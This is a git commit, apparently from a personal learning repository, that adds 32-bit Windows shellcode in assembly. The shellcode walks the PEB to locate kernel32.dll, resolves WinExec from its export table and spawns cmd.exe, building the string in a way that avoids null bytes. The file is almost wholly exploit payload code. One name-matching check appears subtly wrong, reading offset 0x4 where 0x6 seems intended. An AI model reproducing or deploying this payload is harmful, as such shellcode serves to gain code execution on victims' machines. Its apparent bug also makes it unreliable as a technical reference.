2bc70c10f8af25ef048ffc0370129cda45d91f53
SoulX <haojie_34@hotmail.com>
2020-04-28 14:48:45 +0800

    Shellcode
    1. Finished up writing the shellcode in assembly.
    2. Waiting to try to compile it in a 32bits Windows
    3. Created 32bits folder and moved the files over.

---
+++ Windows/Spawn CMD shell/32bits/craftShellcode.asm
@@ -0,0 +1,70 @@
+section .text
+global _WinMain@16
+
+_WinMain@16:
+
+	push eax ; Save all registers
+	push ebx
+	push ecx
+	push edx
+	push esi
+	push edi
+	push ebp
+
+	; Establish a new stack frame
+	push ebp
+	mov ebp, esp
+
+	xor ecx, ecx                ; makes ecx == 0
+	mov eax, [fs:0x30]      ; get PEB from TEB's offset 0x30
+	mov eax, [eax+0xc]          ; get loaded modules into this process's info
+	mov eax, [eax+0x14]         ; access InMemoryOrderModuleList and get info of this exe
+	mov eax, [eax]              ; get info of ntdll.dll
+	mov eax, [eax]              ; get info of kernel32.dll
+	mov ebx, [eax+0x10]         ; get address of kernel32.dll loaded in memory
+	mov edx, [ebx+0x3c]         ; get e_lfanew which has the offset location of PE header
+	add edx, ebx                ; get the exact location of the PE header
+	mov edx, [edx+0x78]         ; get the offset of export table
+	add edx, ebx                ; get the exact location of the export table
+	mov esi, [edx+0x20]         ; get AddressofNames offset
+	add esi, ebx                ; get the exact location of the AddressofNames
+
+Get_CreateProc_Index:
+	inc ecx                     		; increment index counter for AddressOfNameOrdinals later
+	lodsd                       		; get the offset the string address of the function name
+	add eax, ebx						; get the actual address string of the function name
+	cmp dword [eax], 0x456e6957			; "EniW" (remember x86 is little endian)
+	jnz Get_CreateProc_Index			; jump if 1st 4 letters of the function name is different
+	cmp word [eax+0x4], 0x6578			; "ex"
+	jnz Get_CreateProc_Index			; jump if next 2 letters of the function name is different
+	cmp byte [eax+0x4], 0x63			; 'c'
+	jnz Get_CreateProc_Index			; jump if last letter of the function name is different
+
+dec ecx 						; decrease ecx by 1 cause array starts from 1 and Get_CreateProc_Index inc 1st
+mov esi, [edx+0x24]         	; get AddressOfNameOrdinals offset
+add esi, ebx                	; get the exact location of the AddressOfNameOrdinals
+mov ecx, [esi+ecx*2]			; get the index of WinExec()
+mov esi, [edx+0x1c]         	; get AddressOfFunctions offset
+add esi, ebx                	; get the exact location of the AddressOfFunctions
+mov esi, [esi+ecx*4]			; get the offset address of WinExec()
+add esi, ebx                	; get the exact location of WinExec()
+xor ecx, ecx 					; make ecx == 0
+push ecx 						; null terminator for string "cmd.exe"
+push 0x61657865					; "aexe" (remember x86 is little endian)
+sub dword [esp+0x3], 0x61 		; Remove "a"
+push 0x2e646d63					; ".dmc"
+mov eax, esp					; to get the string address of "cmd.exe"
+push 0x5 						; push 5 as WinExec argument for uCmdShow
+push eax						; push string address of "cmd.exe" as WinExec argument for lpCmdLine
+call esi 						; call WinExec()
+add esp, 0xc 					; clear stack
+
+end:
+	pop ebp 		; restore all registers and exit
+	pop edi
+	pop esi
+	pop edx
+	pop ecx
+	pop ebx
+	pop eax
+	ret 16
